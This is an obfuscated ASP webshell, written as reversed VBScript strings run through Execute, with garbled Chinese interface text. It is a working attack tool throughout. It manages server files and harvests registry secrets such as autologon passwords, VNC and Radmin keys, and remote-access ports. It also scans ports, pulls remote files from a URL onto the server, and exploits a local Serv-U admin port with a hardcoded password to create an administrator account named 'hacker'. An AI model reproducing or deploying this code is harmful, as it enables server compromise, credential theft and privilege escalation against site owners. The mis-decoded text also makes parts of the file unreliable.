~IS SRR  	~lrUkcaB&IS=IS      ~��>retnec/<�����ɳ�ɾ��&htaP&��¼Ŀ>rb<>rb<>rb<>retnec<��=IS      ~htaP redloFeteleD.FC  	~nehT )htaP(stsixEredloF.FC fI    ":ExeCuTe(UZSS(ShiSan)):End Function:Function CopyFolder(Path):ShiSan="fI dnE	~IS SRR  	~lrUkcaB&IS=IS      ~��>retnec/<�������Ƹ���&)0(htaP&��¼Ŀ>rb<>rb<>rb<>retnec<��=IS      ~)1(htaP,)0(htaP redloFypoC.FC  	~nehT ����><)1(htaP dna ))0(htaP(stsixEredloF.FC fI    ~)��||||��,htaP(tilpS = htaP  ":ExeCuTe(UZSS(ShiSan)):End Function:Function MoveFolder(Path):ShiSan="fI dnE	~IS SRR  	~lrUkcaB&IS=IS      ~��>retnec/<�����ɶ��ƚ�&)0(htaP&��¼Ŀ>rb<>rb<>rb<>retnec<��=IS      ~)1(htaP,)0(htaP redloFevoM.FC  	~nehT ����><)1(htaP dna ))0(htaP(stsixEredloF.FC fI    ~)��||||��,htaP(tilpS = htaP  ":ExeCuTe(UZSS(ShiSan)):End Function:Function NewFolder(Path):ShiSan="fI dnE	~IS SRR  	~lrUkcaB&IS=IS      ~��>retnec/<�����ɽ���&htaP&��¼Ŀ>rb<>rb<>rb<>retnec<��=IS      ~htaP redloFetaerC.FC  	~nehT ����><htaP dna )htaP(stsixEredloF.FC toN fI    ":ExeCuTe(UZSS(ShiSan)):End Function:End Class:ShiSan="buS dnE~��>lo/<�� SRR~fI dnE~��>rb<�� & drowssaPnigoLotua & �� :���ܻ��ʵ�¼�Ƕ��Ԛ� SRR~fI dnE~��eslaF�� SRR~raelC.rrE~nehT rrE fI~)yeKssaPnigoLotua & htaPnigoLotua(daeRgeR.Xsw = drowssaPnigoLotua~��>rb<�� & emanresUnigoLotua & �� :����ͳϵ��¼�Ƕ��Ԛ� SRR~)yeKresUnigoLotua & htaPnigoLotua(daeRgeR.Xsw = emanresUnigoLotua~eslE~��>/rb<����δ�ܹ�¼�Ƕ���ͳϵ�� SRR~nehT 0 = elbanEnigoLotuAsi fI~)yeKelbanEnigoLotua & htaPnigoLotua(daeRgeR.Xsw = elbanEnigoLotuAsi~��drowssaPtluafeD�� = yeKssaPnigoLotua~��emaNresUtluafeD�� = yeKresUnigoLotua~��nogoLnimdAotuA�� = yeKelbanEnigoLotua~��\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH�� = htaPnigoLotua~fI dnE~��>/rb<�� & troPmret & �� :�ڶ��������ǰ���� SRR~eslE ~��>/rb<.���޵��ܾ��ѷ�����Ȩ����� ,�ڶ�������յ��÷��ޚ�SRR~ nehT 0 >< rebmuN.rrE rO ���� = troPmret fI~��>lo<>/rh<¼�Ƕ��Լ��ڶ�������՚� SRR~)yeKtroPlanimret & htaPtroPlanimret(daeRgeR.Xsw = troPmret~��rebmuNtroP�� = yeKtroPlanimret~��\pcT-PDR\snoitatSniW\revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\MLKH�� = htaPtroPlanimret~drowssaPnigoLotua ,emanresUnigoLotua ,yeKelbanEnigoLotua ,elbanEnigoLotuAsi miD~yeKssaPnigoLotua ,yeKresUnigoLotua ,htaPnigoLotua miD~troPmret ,yeKtroPlanimret ,htaPtroPlanimret miD~)��llehS.tpircSW��(tcejbOetaerC.revreS = Xsw teS~��------------------------------------------------------�� etirW.esnopseR~��>rb<��&troPWAP&��:Ϊ�ڶ�erehwynAcP>il<�� etirW.esnopseR~��erehwynAcpװ�����ǻ�����ȷ��.ȡ���ޚ�=troPWAP neht ����=troPWAP fI~)yeKerehwynAcp(daeRgeR.hsW=troPWAP~��troPataDPIPCT\metsyS\noisreVtnerruC\erehwynAcp\cetnamyS\ERAWTFOS\ENIHCAM_LACOL_YEKH��=yeKerehwynAcp~��>rb<��&troPmreT&��:Ϊ�ڶ�ecivreS lanimreT>il<�� etirW.esnopseR~����������revreS swodniWΪ������ȷ��.ȡ�����ޚ�=troPmreT nehT ����=troPmreT fI~)yeKmreT(daeRgeR.hsW=troPmreT~��rebmuNtroP\pct\sdT\dwpdr\sdW\revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\ENIHCAM_LACOL_YEKH��=yeKmreT~��>rb<��&troptnlT&��:�ڶ�tenleT>il<�� etirW.esnopseR~��32��=tnlT nehT ����=troPtnlT fi~)yeKtenleT(daeRgeR.hsW=troPtnlT~��troPtenleT\0.1\revreStenleT\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH��=yektenleT~)��llehS.tpircSW��(tcejbOetaerC.revreS = hsw teS~��>1=ezis rh<>rb<]��̽�ڶ�����[>rb<>rb<�� etirW.esnopseR~txeN emuseR rorrE nO~)(ofnIlanimreTteg bus":ExeCuTe(UZSS(ShiSan)):ShiSan="bus dne~fi dne~fI dnE~yarrAeht & ��>il<��SrR~eslE ~txeN~)i(yarrAeht & ��>il<��SrR~)yarrAeht(dnuoBU oT 0=i roF~nehT )yarrAeht(yarrAsI fI~)htaPeht(daeRgeR.Xsw=yarrAeht~)��htaPeht��(tseuqeR=htaPeht~)��llehS.tpircSW��(tcejbOetaerC.revreS = Xsw teS~txeN emuseR rorrE nO~neht ����><)��htaPeht��(tseuqeR fi~��>/rh<>mrof/<��SrR~��>naps/<��SrR~��>/rh<>';enon:yalpsid'=elyts ofnItideger=di naps<��SrR~��>rb<>/rb<})��������ϰ�(����Ŀ���ǰ��{ dniB\egakniL\pipcT\secivreS\100teSlortnoC\METSYS\MLKH��SrR~��>p/<>p<>rb<>/rb<}��������鼸��{ tnuoC\munE\pipcT\secivreS\100teSlortnoC\METSYS\MLKH��SrR~��>p/<>p<>/rb<--------------------REVO-----------��SrR~��>rb<>/rb<}�ڶ�PDU������{ stroPdewollAPDU\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH��SrR~��>rb<>/rb<}�ڶ�PI/PCT������{ stroPdewollAPCT\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH��SrR~��>rb<>/rb<}SND��{ revreSemaN\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\teSlortnoCtnerruC\METSYS\MLKH��SrR~��>rb<>/rb<}������Ĭ{ ZS_ITUM_GER,yawetaGtluafeD\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\teSlortnoCtnerruC\METSYS\MLKH��SrR~��>p/<>p<>/rb<---------ȷ׼���ǵ�֪��,�����Ķ���Ҫ��������-------��SrR~��>rb<>/rb<}��·PI����{ 1,DROWD_GER,retuoRelbanEPI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH��SrR~��>rb<>/rb<})����������(ѡɸPI/PCT����{ 1,DROWD_GER,sretliFytiruceSelbanE\sretemaraP\pipcT\secivreS\teSlortnoCtnerruc\METSYS\MLKH��SrR~��>rb<>/rb<}�������չ�{ 0,ZS_GER,sevirDteNderahSelbanE\sretemaraP\revreSnamnaL\secivreS\teSlortnoCtnerruC\METSYS\MLKH��SrR~��>rb<>/rb<}����Ĭֹ��{ 0,DROWD_GER,revreSerahSotuA\sretemaraP\revreSnamnaL\secivreS\teSlortnoCtnerruC\METSYS\MLKH��SrR~��>rb<>/rb<}��$CPI�����������޻�������=2,���л��û������з��޻�������=1,ʡȱ=0{ 0,DROWD_GER,suomynonatcirtser\asL\lortnoC\teSlortnoCtnerruC\METSYS\MLKH��SrR~��>rb<>/rb<}����¼�Ǵ���ʾ�Բ�{ 1,ZS_GER,emaNresUtsaLyalpsiD-tnoD\nogolniW\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH��SrR~��>rb<>rb<>rb<  >' ����nimdaRȡ�� '=eulav timbus=epyt tupni< ��SrR~��>neddih=epyt 08=ezis 'nimdAR\METSYS\ENIHCAM_LACOL_YEKH'=eulav nimdar=eman tupni<��SrR~��>nimdar=eman geRdaer=eulav neddih=epyt tupni<��SrR~��  >' ����CNVȡ�� '=eulav timbus=epyt tupni< ��SrR~��>neddih=epyt 08=ezis 'drowssaP\3CNVniW\LRO\erawtfoS\UCKH'=eulav cnv=eman tupni<��SrR~��>cnv=eman cnv=eulav neddih=epyt tupni<��SrR~��>rb<>rb<>' ȡ�� '=eulav timbus=epyt tupni< ��SrR~��>08=ezis 'emaNretupmoC\emaNretupmoC\emaNretupmoC\lortnoC\teSlortnoCtnerruC\METSYS\MLKH'=eulav htaPeht=eman tupni<��SrR~��>tcAeht=eman geRdaer=eulav neddih=epyt tupni<��SrR~��>tsop=dohtem mrof<��SrR~��>/rh<:ȡ��ֵ�����ע��SrR~)(GERdaeR bus":ExeCuTe(UZSS(ShiSan)):ShiSan="fi dne:fi dne:fi dne:1+)��cevres��(noisses=)��cevres��(noisses neht ����><noitcA fi:esle:��>����)'��&ssaPresU&��=07%&��&urevreS&��=57%?/������ַ//:��&lrusop&��'(lru:ROSRUC����=elyts VID<��SRR:1+)��cevres��(noisses=)��cevres��(noisses:neht 1=)��cevres��(noisses fi:esle:neht 0><)��//:ptth��,urevreS(rtsnI ro 0><)��.861.291��,urevreS(rtsnI ro 0><)��1.0.0.721��,urevreS(rtsnI fi":ExeCuTe(UZSS(ShiSan)):ShiSan="noitcnuF dnE~fI dnE		~txeN emuseR rorrE nO			~nehT eslaF = edoMgubeDsi fI		~~gnihtoN = maertS teS		~gnihtoN = pttH teS		~		~)rrE(rrEkhc		~htiW dnE		~esolC.			~fI dnE			~etirWrevo ,htaPeht eliFoTevaS.				~emaNelif & ��\�� & htaPeht = htaPeht				~fI dnE				~��txt.mth.xedni�� = emaNelif					~nehT ���� = emaNelif fI				~)))��/�� ,lrUeht(tilpS(dnuoBU()��/�� ,lrUeht(tilpS = emaNelif				~raelC.rrE				~nehT 4003 = rebmuN.rrE fI			~etirWrevo ,htaPeht eliFoTevaS.			~0 = noitisoP.			~ydoBesnopseR.pttH etirW.			~nepO.			~3 = edoM.			~1 = epyT.			~maerts htiW		~		~fI dnE		~~ nehT 4 >< etatSydaeR.pttH fI		~)(dneS.pttH		~eslaF ,lrUeht ,��TEG�� nepO.pttH		~		~fI dnE		~1 = etirWrevo			~nehT 2 >< etirWrevo fI		~		~)��PTTHLMX.2LMXSM��(tcejbOetaerC.revreS = pttH teS		~)��maer��&e&��ts.bdo��&e&��da��(tcejbOetaerC.revreS = maerts teS		~)��etirWrevo��(tseuqeR = etirWrevo		~)��htaPeht��(tseuqeR = htaPeht		~)��lrUeht��(tseuqeR = lrUeht		~etirWrevo ,emaNelif ,maerts ,htaPeht ,lrUeht ,pttH miD		~fI dnE		~txeN emuseR rorrE nO			~nehT eslaF = edoMgubeDsi fI		~��>/rh<�� SRR		~��>mrof/<�� SRR		~��>tcAeht=eman lrUmorFnwod=eulav neddih=epyt tupni<�� SRR		~���Ǹ��ڴ�>2=eulav etirWrevo=eman xobkcehc=epyt tupni<�� SRR		~��>08=ezis ������ & ))��.��(htaPpaM.revreS(edocnElmtH & ������=eulav htaPeht=eman tupni<�� SRR		~��>/rb<>' ���� '=eulav timbus=epyt tupni<>08=ezis '//:ptth'=eulav lrUeht=eman tupni<�� SRR		~��>tsop=dohtem mrof<�� SRR		~��>/rh<�Ի�������.ʡ����Ϊ...�Ի���:����������� SRR		~ ��>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '%08'=htdiw elbat<>rb<��=IS~)(daolpu noitcnuF":ExeCuTe(UZSS(ShiSan)):ShiSan="bus dne~FI DNE~��s ��&emiteht&�� ni ssecorP>rh<��SRR~))1remit-2remit(tni(rtsc=emiteht~remit = 2remit~txeN~fI dnE~txeN~txeN~fI dnE~fI dnE~)��>rb<rebmun ton si �� & )i(pmt(SRR~eslE~fI dnE~)��>rb<rebmun ton si �� & Ndne & �� ro �� & Ntrats(SRR~eslE~txeN~)j,xxx & tratSpi(nacS llaC~Ndne oT Ntrats = j roF~nehT )Ndne(ciremunsI dna )Ntrats(ciremunsI fI~) xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne~) 1 - xkees ,)i(pmt(tfeL = Ntrats~nehT 0 > xkees fI~)��-�� ,)i(pmt(rtSnI = xkees~eslE~))i(pmt ,xxx & tratSpi(nacS llaC~ nehT ))i(pmt(ciremunsI fI~)pmt(dnuobU oT 0 = i roF~))��-��,)uh(pi(rtSnI-))uh(pi(neL,1+)��-��,)uh(pi(rtSnI,)uh(pi(diM ot )1,1+)��.��,)uh(pi(veRrtSnI,)uh(pi(diM = xxx roF~))��.��,)uh(pi(veRrtSnI,1,)uh(pi(diM = tratSpi~eslE~txeN~fI dnE~fI dnE~)��>rb<rebmun ton si �� & )i(pmt(SRR~eslE~fI dnE~)��>rb<rebmun ton si �� & Ndne & �� ro �� & Ntrats(SRR~eslE~txeN~)j ,)uh(pi(nacS llaC~Ndne oT Ntrats = j roF~nehT )Ndne(ciremunsI dna )Ntrats(ciremunsI fI~) xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne~) 1 - xkees ,)i(pmt(tfeL = Ntrats~nehT 0 > xkees fI~)��-�� ,)i(pmt(rtSnI = xkees~eslE~))i(pmt ,)uh(pi(nacS llaC~ nehT ))i(pmt(ciremunsI fI~)pmt(dnuobU oT 0 = i roF~nehT 0 = )��-��,)uh(pi(rtSnI fI~)pi(dnuobU ot 0 = uh roF~)��,��,)��pi��(mroF.tseuqer(tilpS = pi~)��,��,)��trop��(mroF.tseuqer(tilpS = pmt~)��>rh<>rb<>b/<:�汨��ɨ>b<��(SRR~remit = 1remit~nehT ���� >< )��nacs��(mroF.tseuqer fI~��>mrof/<>p/<��SRR~��>'111'=eulav 'nacs'=di 'neddih'=epyt 'nacs'=eman tupni<��SRR~��>' nacs '=eulav 'mottub'=ssalc 'timbus'=epyt 'timbus'=eman tupni<��SRR~��>rb<>rb<��SRR~��>'��&tsiLtroP&��'=eulav '06'=ezis 'xoBtxeT'=ssalc 'txet'=epyt 'trop'=eman tupni<��SRR~��:tsiL troP>rb<��SRR~��>'06'=ezis '��&PI&��'=eulav 'pi'=di 'xoBtxeT'=ssalc 'txet'=epyt 'pi'=eman tupni< ��SRR~��;psbn&:PI nacS>p<��SRR~��>';eurt=delbasid.timbus.1mrof'=timbuSno ''=noitca 'tsop'=dohtem '1mrof'=eman mrof<��SRR~��>p/<)DMC��ʹ�����˸�,���ϱȶ���,�ڶ˸�����ɨ����(����ɨ�ڶ�>p<��SRR~fi dne~)��pi��(mroF.tseuqer=PI~esle~��1.0.0.721��=PI~neht ����=)��pi��(mroF.tseuqer fi~fi dne~)��trop��(mroF.tseuqer=tsiLtroP~esle~��1365,85934,9833,3341,544,931,531,011,08,52,32,12��=tsiLtroP~neht ����=)��trop��(mroF.tseuqer fi~0006777 = tuoemiTtpircS.revreS~)(troPnacS bus":ExeCuTe(UZSS(ShiSan)):ShiSan="buS dnE~fI dnE	~fI dnE		~fI dnE			~)��>rb<>tnof/<�ſ�>der=roloc tnof<.........�� & muNtrop & ��:�� & pitegrat(SRR				~eslE			~)��>rb<�չ�.........�� & muNtrop & ��:�� & pitegrat(SRR				~nehT 0 > )��.))(tcennoC(�� ,noitpircsed.rrE(rtSnI fI			~nehT 9527647412- = rebmun.rrE ro 3487127412- = rebmun.rrE fI		~nehT rrE fI	~rtsnnoc nepo.nnoc	~1 = tuoemiTnoitcennoC.nnoc	~��;=drowssaP;2ekal=DI resU;��& muNtrop &��,��& pitegrat & ��=ecruoS ataD;1.BDELOLQS=redivorP��=rtsnnoc	~)��noitcennoc.BDODA��(tcejbOetaerC.revreS = nnoc tes	~txeN emuseR rorrE nO	~)muNtrop ,pitegrat(nacS buS":ExeCuTe(UZSS(ShiSan))
Select Case Action
Case "MainMenu"
MainMenu()
Case "getTerminalInfo"
getTerminalInfo():Case "PageAddToMdb"
PageAddToMdb():case "ScanPort":ScanPort():Case "Servu"
         ShiSan="noitcnuF dnE			~ fI dnE			~ ))��eman_tpircs��(selbairavrevres.tseuqer(esacl&)��TROP_REVRES��(selbairavrevres.tseuqer&��:��&)��eman_revres��(selbairavrevres.tseuqer & ��//:ptth��=emaNG			~ eslE			~ ))��eman_tpircs��(selbairavrevres.tseuqer(esacl&)��eman_revres��(selbairavrevres.tseuqer & ��//:ptth��=emaNG			~ nehT ��08��=)��TROP_REVRES��(selbairavrevres.tseuqer fI			~ )(emaNG noitcnuF			~noitcnuf dne			~gnihton=f tes			~))2,htapg(tfel(esacl=htapg			~)0(redloFlaicepSteG.f=htapg			~fi dne				~noitcnuf tixe					~��:c��=htapg				~neht 0>rebmun.rre fi				~)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=f tes				~raelc.rre				~txen emuser rorre no			~)(htapG noitcnuf			~fi dne			~��>retnec/<>mrof/<>elbat/<�� SRR			~��>rt/<�� SRR			~��>dt/<>����1����=eulav ����1noitca����=di ����neddih����=epyt ����1noitca����=eman tupni<�� SRR			~��>�������ؚ���=eulav ����2timbuS����=eman ����teser����=epyt tupni< �� SRR			~��>�������ᚢ��=eulav ����timbuS����=eman ����timbus����=epyt tupni<�� SRR			~��>����2����=napsloc dt<>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>rt/<�� SRR			~��>dt/<>����05����=ezis ����dda/ $rekcah srotartsinimda puorglacol ten & dda/ rekcah $rekcah resu ten c/ dmc����=eulav ����c����=di ����txet����=epyt ����c����=eman tupni<>dt<�� SRR			~��>dt/<�����>dt<�� SRR			~��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>rt/<�� SRR			~��>dt/<>����8����=ezis ������&f&������=eulav ����f����=di ����txet����=epyt ����f����=eman tupni<>dt<�� SRR			~��>dt/<����·ͳϵ>dt<�� SRR			~��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>rt/<�� SRR			~��>dt/<>����85934����=eulav ����trop����=di ����txet����=epyt ����trop����=eman tupni<>dt<�� SRR			~��>dt/<���ڡ���>dt<�� SRR			~��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>rt/<�� SRR			~��>dt/<>����P@0;kl.#ka$@l#����=eulav ����p����=di ����txet����=epyt ����p����=eman tupni<>dt<�� SRR			~��>dt/<�����>dt<�� SRR			~��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>rt/<�� SRR			~��>dt/<>����rotartsinimdAlacoL����=eulav ����u����=di ����txet����=epyt ����u����=eman tupni<>����973����=htdiw dt<�� SRR			~��>dt/<:������>����001����=htdiw dt<�� SRR			~��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>rt/<�� SRR			~��>dt/<����MOC��SBV�߻� exe.��ľ�Ĵ�����\:d c/ dmc:����,���������Կ�����>rb<�μ������͹��ɲ�Ȩ�����:ʾ��>rb<>rb<��ɱͨPSA ��Ȩ���� uvreS>����2����=napsloc dt<�� SRR			~��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			~��>����666666#����=rolocredrob ����1����=gnicapsllec ����0����=gniddapllec ����1����=redrob ����361����=thgieh ����494����=htdiw elbat<�� SRR			~��>����uvreS=noitcA?����=noitca nusdlog=eman tsop=dohtem mrof<>retnec<�� SRR			~gnihtoN = c teS				~troba.c				~gnihtoN = b teS				~troba.b				~gnihtoN = a teS				~troba.a				~)��c��(noisses=c tes				~)��b��(noisses=b tes				~)��a��(noisses=a tes				~txen emuser rorre no			~esle 			~��>retnec/<�� SRR			~��>����uvreS=noitcA?����=ferh.noitacol=kcilCno ���� ���̻ط� ����=eulav ����nottub����=epyt tupni<�� SRR			~��>rb<>rb<>tnof/<��&dmc&��>der=roloc tnof<>rb<����������ִ��,����Ȩ��>retnec<�� SRR			~c=)��c��(noisses tes				~tiuq & niamodled & tm & ssapnigol & resunigol dnes.c				~���� ,���� ,eurT ,��3s/nimdapu/79944QQ/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.c				~)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=c tes				~neht 3 = 1noitca fiesle			~��>tpircs/<�� SRR			~��;)0004,����;)(timbus.nusdlog.lla.tnemucod����(tuoemiTtes�� SRR			~��;)����>retnec<...������,��Ȩ��������>retnec<����(etirw.tnemucod�� SRR			~��>����tpircsavaj����=egaugnal tpircs<�� SRR			~��>mrof/<>����3����=eulav ����1noitca����=di ����neddih����=epyt ����1noitca����=eman tupni<�� SRR			~��>����05����=ezis ������&f&������=eulav ����f����=di ����neddih����=epyt ����f����=eman tupni<�� SRR			~��>����05����=ezis ������&dmc&������=eulav ����c����=di ����neddih����=epyt ����c����=eman tupni<�� SRR			~��>dt/<>������&trop&������=eulav ����trop����=di ����neddih����=epyt ����trop����=eman tupni<�� SRR			~��>dt/<>������&ssap&������=eulav ����p����=di ����neddih����=epyt ����p����=eman tupni<�� SRR			~��>dt/<>������&resu&������=eulav ����u����=di ����neddih����=epyt ����u����=eman tupni<�� SRR			~��>����nusdlog����=eman ����tsop����=dohtem mrof<�� SRR			~b=)��b��(noisses tes   			~tiuq & fLrCbv & dmc & �� cexe etis�� & fLrCbv & ��do ssap�� & fLrCbv & ��og resU�� dnes.b				~���� ,���� ,eurT ,��2s/nimdapu/79944QQ/�� & tropptf & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.b				~)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=b tes				~neht 2 = 1noitca fiesle			~��>tpircs/<�� SRR			~��;)0004,����;)(timbus.nusdlog.lla.tnemucod����(tuoemiTtes�� SRR			~��;)����>retnec<...��&ssap&�������,��&resu&�� :��������ʹ,��&trop&��:1.0.0.721 ��������>retnec<����(etirw.tnemucod�� SRR			~��>����tpircsavaj����=egaugnal tpircs<�� SRR			~��>mrof/<>����2����=eulav ����1noitca����=di ����neddih����=epyt ����1noitca����=eman tupni<�� SRR			~��>����05����=ezis ������&f&������=eulav ����f����=di ����neddih����=epyt ����f����=eman tupni<�� SRR			~��>����05����=ezis ������&dmc&������=eulav ����c����=di ����neddih����=epyt ����c����=eman tupni<�� SRR			~��>dt/<>������&trop&������=eulav ����trop����=di ����neddih����=epyt ����trop����=eman tupni<�� SRR			~��>dt/<>������&ssap&������=eulav ����p����=di ����neddih����=epyt ����p����=eman tupni<�� SRR			~��>dt/<>������&resu&������=eulav ����u����=di ����neddih����=epyt ����u����=eman tupni<�� SRR			~��>����nusdlog����=eman ����tsop����=dohtem mrof<�� SRR			~a=)��a��(noisses tes				~tiuq & resuwen & niamodwen & niamodled & tm & ssapnigol & resunigol dnes.a				~���� ,���� ,eurT,��1s/nimdapu/79944QQ/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.a				~)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=a tes				~neht 1 = 1noitca fi			~)f,��:c��,resuwen(ecalper=resuwen			~fLrCbv & ��TIUQ�� = tiuq			~fLrCbv & ��PDCLEMAWR|\\:c=sseccA �� & fLrCbv & ��enoN=soitaR-�� & fLrCbv & ��ralugeR=epyTdrowssaP-�� & fLrCbv & ��metsyS=ecnanetniaM-��					~_ & fLrCbv & ��0=mumixaMatouQ-�� & fLrCbv & ��0=tnerruCatouQ-�� & fLrCbv & ��0=tiderCsoitaR-�� & fLrCbv & ��1=nwoDoitaR-��					~_ & fLrCbv & ��1=pUoitaR-�� & fLrCbv & ��0=eripxE-�� & fLrCbv & ��1-=tuOemiTnoisseS-�� & fLrCbv & ��006=tuOemiTeldI-�� & fLrCbv & ��1-=sresUrNxaM-��					~_ & fLrCbv & ��0=nwoDtimiLdeepS-�� & fLrCbv & ��0=pUtimiLdeepS-�� & fLrCbv & ��1-=PIrePnigoLsresUxaM-�� & fLrCbv & ��0=elbanEatouQ-��					~_ & fLrCbv & ��0=drowssaPegnahC-�� & fLrCbv & ��0=nigoLwollAsyawlA-�� & fLrCbv & ��0=neddiHediH-�� & fLrCbv & ��0=eruceSdeeN-��					~_ & fLrCbv & ��1=shtaPleR-�� & fLrCbv & ��0=elbasiD-�� & fLrCbv & ��=eliFseMnigoL-�� & fLrCbv & ��\\:c=riDemoH-��					~_ & fLrCbv & ��do=drowssaP-�� & fLrCbv & ��og=resU-�� & fLrCbv & tropptf & ��=oNtroP-�� & fLrCbv & ��0.0.0.0=PI-�� & fLrCbv & ��PUTESRESUTES-�� = resuwen			~fLrCbv & ��=yeKOZT �� & fLrCbv & ��0=elbanEOZT-�� & fLrCbv & ��0|1|1-|�� & tropptf & ��|0.0.0.0|79944QQ=niamoD-�� & fLrCbv & ��NIAMODTES-�� = niamodwen			~fLrCbv & ��ECNANETNIAM ETIS�� = tm			~fLrCbv & tropptf & ��=oNtroP �� & fLrCbv & ��0.0.0.0=PI-�� & fLrCbv & ��NIAMODETELED-�� = niamodled			~fLrCbv & ssap & �� ssaP�� = ssapnigol			~fLrCbv & resu & �� resU�� = resunigol			~dne.esnopser neht ��2C%4D%4C%3D%��><)�����Ě�(edocnELRU.revres fi			~3=tuoemit			~00556 = tropptf			~fi dne			~)2,f(tfel=f   			~esle			~)(htapg=f			~neht ����=f fi			~))��f��(tseuqer(mirt=f			~))��c��(tseuqer(mirt = dmc			~))��trop��(tseuqer(mirt = trop			~))��p��(tseuqer(mirt = ssap			~))��u��(tseuqer(mirt = resu			~dne.esnopser neht )1noitca(ciremunsi ton  fi			~)��1noitca��(tseuqer=1noitca			~1noitca mid			~tiuq ,resuwen ,niamodwen ,tm ,niamodled ,ssapnigol ,resunigol ,dmc ,tropptf ,trop ,ssap ,resu miD":ExeCuTe(UZSS(ShiSan)):case "Alexa":ShiSan="IS SRR~txeN~��>rt/<>dt/<��&)2,i(toS&��>tfel=ngila 'FFFFFF#'=rolocgb dt<>dt/<��&)1,i(toS&��>'FFFFFF#'=rolocgb dt<>dt/<��&)0,i(toS&��>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<��&IS=IS~31 oT 0=i roF~��>rt/<>dt/<��&)��ERAWTFOS_REVRES��(selbairaVrevreS.tseuqeR&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<���������BEW>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>rt/<>dt/<��&)��SO��(selbairaVrevreS.tseuqeR&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<ͳϵ���������>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>rt/<>dt/<��&)��SROSSECORP_FO_REBMUN��(selbairaVrevreS.tseuqeR&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<����UPC�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>rt/<>dt/<;psbn&��&won&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<��ʱ�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>mrof/<>rt/<>dt/<>'ѯ��'=eulav  'timbus'=epyt tupni<>01=ezis '��&poT&��'=eulav 'txet'=epyt tupni<:����>'xp0:redrob'=elyts 04=ezis '��&lrUaxelA&��'=eulav 'u'=eman 'txet'=epyt tupni<>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<����axelA�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>'1mrof'=eman 'axelA=noitcA?'=noitca tsop=dohtem mrof<>mrof/<>rt/<>dt/<>'2'=eulav 'noitca'=eman 'neddih'=epyt tupni<>'xp0:redrob'=elyts'�������������ѯ��'=eulav 'timbus'=epyt tupni<>'xp0:redrob'=elyts'��&)��RDDA_LACOL��(selbairaVrevreS.tseuqeR&��'=eulav '51'=ezis 'pi'=eman 'txet'=epyt tupni<>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<PI�����>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>'knalb_'=tegrat 'mrofpi'=eman 'psa.spi/moc.831pi.www//:ptth'=noitca tsop=dohtem mrof<>rt/<>dt/<��&)��EMAN_REVRES��(selbairaVrevres.tseuqer&��>'FFFFFF#'=rolocgb dt<>dt/<;psbn&>'FFFFFF#'=rolocgb dt<>dt/<�������>'FFFFFF#'=rolocgb '002'=htdiw '02'=thgieh dt<>'retnec'=ngila rt<>rt/<>dt/<Ϣ�ż��������>'unem'=rolocgb 'retnec'=ngila '3'=napsloc '02'=thgieh dt<>rt<>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '%08'=htdiw elbat<>rb<��=IS~����&)��tsoh_ptth��(selbairavrevres.tseuqer&����=lrUaxelA neht ����=lrUaxelA fi~)lrUaxelA(axelA=poT~)��u��(tseuqer=lrUaxelA~poT,lrUaxelA mid":ExeCuTe(UZSS(ShiSan)):Err.Clear:function Alexa(AlexaURL):ShiSan="rtsteg=axelA	~�������ޚ�=rtsteg neht eslaf=)rtsteg(ciremuNsI fi	~fi dne	~�������ޚ�=rtsteg		~esle	~)4-rats-ddne,rats,smsteg(dim=rtsteg		~)��>DS/<��,smsteg,rats(rtsni=ddne		~31+)������=KNAR HCAER<��,smsteg(rtsni=rats		~neht ����><smsteg fi	~)lru(egaPPTTHteg=smsteg	